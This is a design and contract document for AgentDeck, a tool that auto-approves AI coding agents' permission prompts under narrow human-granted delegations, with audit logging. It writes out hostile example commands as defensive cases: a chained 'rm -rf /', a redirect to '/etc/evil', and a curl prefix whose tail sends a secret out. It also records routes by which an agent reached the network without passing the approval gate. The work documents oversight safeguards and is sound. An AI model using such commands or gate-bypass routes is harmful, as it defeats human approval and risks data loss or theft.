# Delegation Contract (`delegation/v1` via `project-view/v1`)

Discovery entrypoint: `agentdeck contract delegation` (`--example` adds stable
GUI-ready examples; the payload exposes both `grant_command_template` and
`mcp_grant_command_template`). Source of truth for fields, examples, payload
and the list validator is `src/agentdeck/contracts.py`
(`DELEGATION_LIST_RESPONSE_FIELDS`, `DELEGATION_ITEM_FIELDS`,
`DELEGATION_BOXES_RESPONSE_FIELDS`, `BOXES_WATCH_RESPONSE_FIELDS`,
`validate_delegation_list_contract()`).

Scoped authorization delegation lets a human pre-sanction one narrow class of
worker authorization boxes — commands matching an explicit prefix for one
agent — so AgentDeck can press the Enter the human would have pressed,
with every release audited. Data source: round 6/7 live loops
(`docs/superpowers/specs/2026-07-26-scoped-authorization-delegation.md`).

## Registry Shapes

`delegations[]` items are a discriminated union on `kind`:

- `kind="command_prefix"` — the original prefix shape. Legacy records written
  before the discriminator existed have no `kind` field on disk; readers
  (including `delegation list`) must treat a missing `kind` as
  `command_prefix` — zero migration.
- `kind="mcp_tool"` — one grant covers exactly one
  `(agent, mcp_server, mcp_tool)` pair (no whole-server wildcard;
  `hover` + `press_key` require two grants).
- `kind="exact_command"` — one grant covers exactly one full command, matched
  by equality: **nothing may be appended**. This is the narrowest rung and the
  only one where "just this one command" is literally true. It exists because
  a prefix pins only the head: granting the whole observed command as a
  *prefix* still covers `curl <url> -o <path>` (writes a file) and
  `curl <url> -d @<file>` (sends one), neither of which is a shell redirect,
  so none of the composite hard-refusals apply (walk-away round 1, finding
  F2). Both sides are compared with whitespace folded to single spaces — the
  same trade-off the folded-box command extractor already makes.

Commands:

- `agentdeck delegation grant --agent <agent_id> --prefix <prefix> --confirm`
  appends to the authoritative `delegations[]` list (registered
  `grant_delegation` writer): `{delegation_id, agent_id,
  kind="command_prefix", prefix, mcp_server=null, mcp_tool=null, created_at,
  revoked_at=null}` plus a `delegation_granted` event (now carrying `kind`
  and the null MCP fields). Unknown agent, empty prefix, missing `--confirm`,
  or a duplicate active `(agent, prefix)` pair refuse with zero writes.
- `agentdeck delegation grant --agent <agent_id> --mcp-server <server>
  --mcp-tool <tool> --confirm` is the mutually exclusive MCP form: it writes
  `{delegation_id, agent_id, kind="mcp_tool", prefix=null, mcp_server,
  mcp_tool, created_at, revoked_at=null}` plus a `delegation_granted` event
  carrying `kind`/`mcp_server`/`mcp_tool`. Giving both `--prefix` and the MCP
  pair, neither, only one of `--mcp-server`/`--mcp-tool`, an empty server or
  tool, a server or tool not fully matching `[A-Za-z0-9_-]+` (the box
  extractor's charset — an out-of-charset value could never be released
  during walk-away, a silent no-op; both the CLI and the
  `grant_delegation` writer reject it), an unknown agent, or a duplicate
  active `(agent, server, tool)` triple refuse with zero writes. Duplicate-active refusal is per kind:
  `(agent, prefix)` for `command_prefix`, `(agent, mcp_server, mcp_tool)`
  for `mcp_tool`, `(agent, exact_command)` for `exact_command` — the same
  server with a different tool is a new grant.
- `agentdeck delegation grant --agent <agent_id> --exact-command <command>
  --confirm` writes the equality shape:
  `{delegation_id, agent_id, kind="exact_command", prefix=null,
  exact_command, mcp_server=null, mcp_tool=null, created_at,
  revoked_at=null}`, plus a `delegation_granted` event carrying
  `kind`/`exact_command`. The three forms are mutually exclusive: giving more
  than one, or none, refuses with zero writes, as does an empty
  `--exact-command` — an empty value could never match a box on screen, so
  the delegation would fail silently during a walk-away segment, which is the
  same reason the MCP charset is enforced at grant time.
  `gate-preview` emits this form for the one ladder rung whose
  `unpinned_tail` is empty, and the prefix form for every rung that leaves a
  tail; the rendered width claim and the grant it hands you therefore agree.
- `agentdeck delegation list` (read-only) returns `mode=delegation_list` with
  `count`/`items[]`; each item carries the stored fields plus derived
  `active` (`revoked_at` is null), a normalized `kind`
  (`command_prefix` default for legacy kind-less records), and explicit
  `mcp_server`/`mcp_tool`/`exact_command` — each kind fills only its own
  fields and leaves the others null, so `prefix` never carries a whole
  command and never has to be read as anything but a prefix. Validates with
  `validate_delegation_list_contract()` before printing.
- `agentdeck delegation revoke --delegation-id <id> --confirm` sets
  `revoked_at` (registered `revoke_delegation` writer) plus a
  `delegation_revoked` event; unknown or already-revoked ids refuse. A revoked
  `(agent, prefix)` pair may be granted again.

## Box Shapes

- `agentdeck agent boxes --agent <id>` (read-only) captures the agent's pane,
  detects a pending authorization box (same tail-window heuristics as
  `agent capture`'s `waiting_for_input`), extracts the boxed `$ command`
  (indented continuation lines joined until the option list; when codex
  collapses a long box body and the `$ ` line is not visible — a round 9
  live finding — the fallback extracts the backtick-quoted prefix from the
  box's own "commands that start with `…`" option text, joining wrapped
  lines without inserting spaces). Command extraction is region-anchored to
  the pending box by the same rule as the MCP extractor (only lines after
  the second-to-last waiting-marker line are searched, so a stale box's
  `$ ` line above the pending box is never extracted; the pending box's own
  `$ ` line and option-2 backtick text sit below the box's own
  second-to-last marker and are never excluded), and the collapsed-box
  fallback takes the **last** occurrence of the option-2 marker text in the
  region (same reverse-scan rationale). It reports
  `box_present`, `waiting_hint`, `command`, `box_kind`
  (`command` | `mcp_tool` | null), `mcp_server`, `mcp_tool`, `match_kind`,
  `matched_segments`, `delegated`, `delegation_id`, and the explicit
  `release_command`. It never writes state and never sends input.
- MCP tool boxes (the fifth box class, round 11 live finding #3; wording
  verified verbatim against a live capture in round 12): codex MCP tool
  authorization boxes carry the body sentence
  `Allow the <server> MCP server to run tool "<tool>"?` — the tool name may
  be quoted, and parameter lines (`includeSnapshot: false`, `uid: 1_20`, …)
  may sit between the sentence and the option list. Command extraction is
  tried first (region-anchored to the pending box, see above); only when it
  yields nothing is the MCP extractor tried. The hard guarantee is a
  **structural tie to the live box**: after whitespace collapse, the
  sentence's trailing `?` must be followed by the live selected-option glyph
  sequence `›1.`, and the gap in between may contain only parameter-line
  material — a gap containing another `›` (a selector), another `?` (a
  different box's question), a `$` (a command line), or a backtick (command-
  box option text) is treated as cross-box bridging and never matches. An
  already-answered sentence collapsed into a one-line history entry (e.g.
  `? -> Yes`) has no live selector after it and never matches. This also
  means extraction only succeeds when option 1 ("Allow" / "Yes, proceed") is
  the pre-selected option — exactly what the bare Enter will press. Two
  heuristic layers sit on top as defense in depth: region anchoring (the
  pending-box region is computed over the **full captured pane**, not a
  10-line tail — round 12 found a box whose option 2 quotes a very long
  command can overflow any small tail window; only lines after the
  second-to-last waiting-marker line are searched, so an answered box that
  still retains its own marker footer keeps its sentence out of the region,
  while the pending box's sentence carries no marker and is never excluded)
  and last-match bias (the last match in the region wins, same reverse-scan
  rationale as waiting-hint detection). The extractor also collapses all
  whitespace in the region before matching (TUI folds can land mid-token;
  fold-point spaces are lost) with the trailing `?` as a hard boundary. Any
  parse failure returns null — fail-closed: an unparsable or unknown wording
  degrades to the sentinel's existing skip behavior, never to a wrong
  release.
- Pane loss during a watch scan (round 12 live finding): if `capture-pane`
  fails for a scanned agent (the pane vanished mid-scan), the scan records a
  `skipped[]` item with reason `pane capture failed` and continues the
  bounded loop instead of crashing; binding reconciliation stays with the
  explicit `agentdeck agent refresh`.
- `agentdeck agent release-box --agent <id> --confirm` re-detects the box and
  sends a bare Enter **only** when an active delegation for that agent covers
  the box: for command boxes the extracted command
  (`command.startswith(prefix)`, falling back to a whitespace-collapsed
  comparison so a wrap that landed exactly on a real space — e.g. a
  `git add` prefix — still matches); for MCP tool boxes a plain exact
  `(mcp_server, mcp_tool)` equality per field with no normalization on
  either side (grant-time charset validation makes `==` correct; one-sided
  normalization would be fail-open widening), matching only
  `kind="mcp_tool"` records for the same agent; success appends an
  `auth_box_released` event carrying the delegation id, full command (null
  for MCP boxes), `box_kind`, `mcp_server`, `mcp_tool`, `match_kind`,
  `matched_segments` (see Composite matching below), and `waiting_hint`
  (on-screen evidence of the box that was released). No box, no extractable
  command or MCP pair, no covering delegation, or missing `--confirm` refuse
  with zero input sent.
- **Composite matching** (round 12 live finding #3; spec
  `docs/superpowers/specs/2026-07-30-delegation-match-normalization-design.md`):
  shell-wrapped commands whose substance is already delegated — env-assignment
  prefixes (`REPRODUCE_UNCONTROLLED_BOOTSTRAP=1 node tests/x.mjs`), `for`-loop
  wrappers, and multi-command chains — cannot match a bare
  `command_prefix.startswith`. The pure module `agentdeck.delegation_match`
  adds a **split-and-cover** third matching arm, and the box surfaces route
  through it via `_match_delegation_with_provenance`:
  - Semantic: the command is split at top level and matches only when **every**
    segment is either covered (starts with an active `command_prefix`
    delegation of that agent, after control-word and env-assignment stripping)
    or is on the fixed built-in glue allowlist, **and at least one segment is
    covered by a real delegation** (all-glue commands never release).
  - Danger boundary (hard requirement): a **composite** command never reuses
    the plain-prefix verdict, because the leading segment alone would carry it
    — `node tests/x.mjs; rm -rf /` starts with a delegated `node tests/`
    prefix. Any command that is more than one simple command (top-level `;`,
    `&&`, `||`, `|`, newline) or that the module cannot parse must pass
    split-and-cover as a whole; otherwise it does not match at all. A single
    command **containing any redirect** is treated the same way (a review
    finding: `node tests/x.mjs > /etc/evil` starts with a delegated prefix but
    writes an arbitrary path), so redirect confinement applies uniformly —
    `> /tmp/x.log` still matches, as a `composite` match. Plain prefix /
    whitespace-collapsed / MCP matching is unchanged for single simple
    commands without redirects.
  - Hard-reject set (scanned before splitting, whole command refused):
    command substitution `$(`, backquote, process substitution `<(` / `>(`,
    heredoc `<<`; plus, during splitting, an input redirect `<`, a background
    `&` (the `>&` of `2>&1` excepted), and unbalanced single/double quotes;
    plus, per segment, a leading `eval` or `source`. `${var}` references are
    permitted — they are not command substitution.
  - Redirects: only `2>&1` and `>` / `>>` (with or without an fd prefix) whose
    target is a single `/tmp/…` token containing no `..`. Every other token
    containing `>` is hard-rejected, which closes two fail-opens: non-`2` fd
    prefixes (`1>>`, `3>`, `10>`) once escaped the `/tmp` confinement, and the
    shell reads word-glued forms (`echo foo>/etc/evil`) as redirects while
    whitespace tokenization makes them look like ordinary arguments.
  - Glue allowlist v1 (fixed, built-in, **not** configurable; extending it is
    an explicit code change with tests): assignments `name=value` (including
    `name=$?` and `${…}` values); `echo …`; `exit` / `exit <token>`; `true`;
    `test …` and `[ … ]`; loop/conditional scaffolding — `for <name> in
    <simple-word list>` (words matching `[A-Za-z0-9._\-]+` or `${…}`), leading
    `do` / `then` / `else` stripped, standalone `done` / `fi`, `if [ … ]`; and
    `tail …` / `head …` **only** when every path-like argument starts with
    `/tmp/` and contains no `..` (flags such as `-80` allowed). Nothing else.
  - Provenance: `match_kind` is `prefix` (plain or whitespace-collapsed
    match), `exact` (equality match against an `exact_command` grant),
    `composite` (split-and-cover match), `mcp_tool` (MCP-pair match),
    or null when the box is undelegated or absent — so every delegated box
    carries a uniform match provenance. `exact` is not a flavour of `prefix`
    and must never be reported as one: the two differ by an entire unpinned
    tail, and an audit line that called an equality match a prefix match
    would be claiming something that does not hold. `matched_segments` is populated for
    `composite` matches only (a list of `{segment, via}`, where `via` is the
    covering prefix verbatim or the literal `"glue"`) and null otherwise.
    `delegation_id` is the delegation whose prefix covered the first covered
    segment. Both fields appear in `agent boxes`, `release-box`, the
    `released[]` items of `boxes watch` / `run-loop --release-boxes`, and the
    `auth_box_released` event payload. They are audit provenance, not
    authorization.
  - Normalization never widens what a prefix means: round 12's sample 3 stays
    partially manual by design because its `node --check tests/…` segment
    matches no `node tests/` delegation — the human may explicitly grant a
    `node --check tests/` prefix to automate that chain. Inside the composite
    arm, fold-artifact extractions generally fail tokenization and stay
    manual by design; the collapsed-box fallback's own extraction (the
    option-2 prefix text, e.g. `node tests/`) is a clean single command and
    still matches via the prefix arm as before. Any unparseable input yields
    no match and falls back to today's manual path.
- `agentdeck boxes watch --confirm --iterations <n> --interval <seconds>
  [--agent <id>]` is the bounded delegated-automation loop: it requires
  `--confirm` **and** `config.leader.approval_mode == "autonomous"` (the same
  gate class as `run-loop`/`approval auto`), refuses `--iterations < 1`, and
  refuses a **negative `--interval`** (2026-08-01; zero is legal and means "no
  sleep between iterations"). The interval refusal happens before the first
  scan, so it releases nothing and writes nothing; it is the same shared helper
  (`_reject_negative_interval`) used by the other seven `--interval` entry
  points, and it exists because the sleep is guarded by `if interval > 0` — a
  negative value silently means "never sleep", turning a bounded, paced
  delegated-release loop into an unpaced burst against live panes. It scans
  running agents each iteration, releases only delegation-covered boxes (each
  release audited as
  `auth_box_released` with `source=boxes_watch`), records non-covered boxes in
  `skipped[]` with `reason=no active delegation`, and always stops at the
  iteration bound. `released[]` and `skipped[]` items (and the shared
  `_scan_release_delegated_boxes` used by `run-loop --release-boxes`) carry
  the same `box_kind`/`mcp_server`/`mcp_tool` fields as `release-box`;
  `released[]` items additionally carry `match_kind`/`matched_segments`.
  Every `skipped[]` item — both reasons — additionally carries `waiting_hint`
  (the captured on-screen marker line) and `box_pending` (whether the pane
  genuinely shows a pending box, proven by the active selector glyph `›1.`).
  Both keys are present on **both** skip shapes, null/false on the
  `pane capture failed` branch, so a consumer never has to branch on `reason`
  to read the array. They exist for the run-loop host's human-gate detection
  (`docs/contracts/run-loop-host-schema.md`) and are **evidence only** — they
  do not affect which boxes are released, and never authorize a press.

## Gate preview: from a stopped walk-away segment to an explicit decision (2026-08-03)

`agentdeck delegation gate-preview [--agent <id>]` is **read-only**. It bridges
the two halves that already existed: the walk-away segment stops on an
undelegated authorization box and hands over the full evidence
(`docs/contracts/run-loop-host-schema.md`, `human_gate`), and `delegation grant`
can pre-sanction that class of box — but nothing connected them, so a human had
to copy the command out, invent a prefix, hand-type a grant, and release the box.
Design: `docs/superpowers/specs/2026-08-03-delegation-gate-preview-design.md`.

### Two read-only evidence sources

| `source` | Where the box comes from | Pane reads |
| --- | --- | --- |
| `host_record` (default) | `.agentdeck/run-loop-host/host.json` → `human_gate` | **zero** — tmux is never even instantiated |
| `agent_scan` (`--agent <id>`) | one live read-only scan, reusing the `agent boxes` core | one, same as `agent boxes` |

`run-loop --follow` never writes a host record, so its users can only take the
`--agent` path; that is why both exist.

### Width is the human's choice, never AgentDeck's

For one command box the response carries a **deterministic prefix ladder**, in
`candidates[]`, narrowest first. Width differs by orders of magnitude across the
ladder, which is the entire reason the command exists:

```
.../playwright_cli.sh open file:///…/index.html   → only that one command
.../playwright_cli.sh open                        → any target
.../playwright_cli.sh                             → navigate / fill / evaluate too
```

Ladder derivation is a pure function (`src/agentdeck/gate_preview.py`,
`prefix_ladder`): whitespace tokens, longest prefix first, capped at
`GATE_PREVIEW_LADDER_CAP` (5) with the narrowest and the widest always present.
Each `candidates[]` item carries the fields in
`gate_preview.GATE_PREVIEW_CANDIDATE_FIELDS` (single source; the contract layer
imports it and never retypes it):

| Field | Meaning |
| --- | --- |
| `index` | 1-based position in the ladder |
| `prefix` | the literal text to paste into `--prefix` |
| `unpinned_tail` | the part this prefix does **not** pin — i.e. what may be anything |
| `is_widest` | bare single token, the maximum width. A statement of fact, not a rating |
| `grant_command` | the exact `delegation grant … --confirm` for this candidate |

**The response never recommends, ranks by safety, pre-selects, or highlights a
candidate**, and there is a regression test pinning that the rendering contains
no "建议 / recommended / safe" wording. Which prefix to grant is a judgement
about what a command can do, and AgentDeck cannot make it.

An MCP tool box has **no ladder**: one grant covers exactly one
`(server, tool)` pair, so `candidates` is empty and `grant_command` is the exact
MCP form.

### The whole loop is laid out, as text only

The response also carries `release_command` — after a grant, the pending box
still needs one explicit `agentdeck agent release-box --agent <id> --confirm`.
Preview emits both steps as strings; it performs neither.

### Why there is deliberately no danger detector

`verification_notice` states, once, that AgentDeck cannot verify what a command
does, and that **the absence of a warning does not mean the command is safe**.

The guidance above ("never grant push / install / network-changing prefixes")
might suggest shipping a pattern detector. That is a **deliberate non-goal**: a
detector that only recognises `push|install|curl` makes "no warning" read as
"safe" for everything it does not recognise — a displayed fact that does not
hold, which is the defect class this project has repeatedly had to remove. One
honest sentence beats a partial guard that looks like protection.

### Boundaries

Writes nothing: no state, no events, no grant, no release, no provider call, no
tmux input. Empty states are explicit and exit non-zero: no host record (with a
pointer to the `--agent` form), no `human_gate` in the record, no box on the
agent, or a box already covered by an active delegation (which reports the
`delegation_id` and the release command, since a second grant would be
redundant). Response fields are
`DELEGATION_GATE_PREVIEW_RESPONSE_FIELDS`, guarded by
`validate_delegation_gate_preview_contract()` before printing; discovery is the
existing `agentdeck contract delegation` (this is the delegation family — **not**
a new contract, and the contract index count is unchanged).

## Recommended read-only starter pack (2026-08-01)

Accumulated live evidence (rounds 8–13) shows worker authorization boxes are
dominated by a small, stable set of local read-only verification commands.
Composite chains refuse when ANY segment lacks a delegation (fail-closed by
design), so a missing read-only prefix stalls the whole walk-away segment
until a human grants it — round 13 stalled twice this way (`node --check`,
then `rg`/`git log`).

Recommended per-agent grants for coding workers (each one still an explicit,
individually audited human command — there is no bulk-grant, and this list
is documentation, not an auto-applied preset):

```bash
agentdeck delegation grant --agent <id> --prefix "node tests/" --confirm
agentdeck delegation grant --agent <id> --prefix "node --check tests/" --confirm
agentdeck delegation grant --agent <id> --prefix "git status" --confirm
agentdeck delegation grant --agent <id> --prefix "git log" --confirm
agentdeck delegation grant --agent <id> --prefix "git diff" --confirm
agentdeck delegation grant --agent <id> --prefix "rg -n" --confirm
```

Plus, for agents expected to commit to task worktrees: `git add`,
`git commit` (worktree-scoped by task design; never `git push`). Do not add
open-ended interpreters (`node -e`, `python -c`, `bash`), installers, or
network-reading prefixes to any pack — arbitrary-content commands must stay
on the human-eyes path (round 10 conclusion). On network reads specifically,
see the dedicated boundary below: they are not network *mutations*, but they
do not belong in a pack either, and the reason is worth stating precisely.

## Boundaries

- A delegation is not a permission grant: it only automates the Enter a human
  would press on the pre-selected option of a matching box. Reject/esc paths
  are never automated; non-matching boxes always wait for the human.
- Guidance: grant prefixes only for local read-only verification commands
  (e.g. the starter pack above) and task-worktree-scoped git writes; never
  for push, install, or network mutation prefixes.
- Guidance (network reads): a network *read* prefix (`curl`, `wget` and the
  like) is a third category — it is genuinely not a mutation, so the line
  above does not forbid it, but it does not belong in a starter pack either.
  The reason is the unpinned tail: a prefix pins the URL and nothing else,
  and the tail can turn a read into an exfiltration — `curl -s <url> -d
  @<secret>` still matches the prefix `curl -s <url>`, while no tail on
  `git status` can do anything comparable. Granting one is therefore an
  explicit, per-command human decision made in full knowledge that the tail
  is granted along with it. AgentDeck cannot verify a command's nature; the
  human owns that judgment at grant time — the same division of
  responsibility as the MCP guidance below.
- Known gap, part 1 — the shell path (needs its own spec; do not work around
  it by loosening grants): a worker's `curl` / `wget` does raise a normal
  command box and is correctly caught as a human gate, but there is no safe
  way to express "let this worker read exactly this one URL", because prefix
  matching is `startswith` and cannot pin the tail. So a task whose premise
  is reading a live site (replicate this page, check this API) stalls on that
  box every time.
- Known gap, part 2 — the built-in-tool path, and the more serious of the
  two: a CLI agent's *own* tools (codex's web search, an agent's built-in
  fetch/browser) run under **that agent's** permission model, not AgentDeck's.
  They raise no `$ command` box and no MCP box, so they are not delegatable,
  never become a human gate, and — the part that matters — **AgentDeck
  neither authorizes nor observes them**. The delegation model's premise
  ("automate the Enter a human would otherwise press") presupposes a box;
  on this path there is no box and no human.
- Correction (2026-08-03, same day): an earlier version of this section
  claimed "every network read is a permanent human gate" and that such a task
  "cannot progress through a walk-away segment at all". Walk-away round 1
  disproved both within 11 waves: the planner fetched the target site through
  codex's built-in web search with **no box at all**, and only later raised a
  box by falling back to `curl`. Both paths coexist; only one of them passes
  through a gate. Evidence:
  `docs/validation/2026-08-03-walkaway-round-1.md` (finding F1).
- Guidance (MCP): grant MCP delegations only for read-only-natured tools
  (the hover/press_key/screenshot class), never for page-mutating tools
  (the navigate/fill/evaluate_script class). AgentDeck cannot verify a
  tool's nature; the human owns that judgment at grant time.
- Release invariants are unchanged for MCP boxes: only a bare Enter on the
  pre-selected option ("Yes, proceed"); the session-level allow (option 2)
  and reject/esc (option 3) are never selected; option navigation is never
  automated; a recurring tool box is released one box at a time, each
  audited.
- `delegation list` / `agent boxes` are inspection-only: no state writes, no
  tmux input, no provider calls.
- Every automated release is auditable via `auth_box_released` events in
  `agentdeck events` / `agentdeck history`.
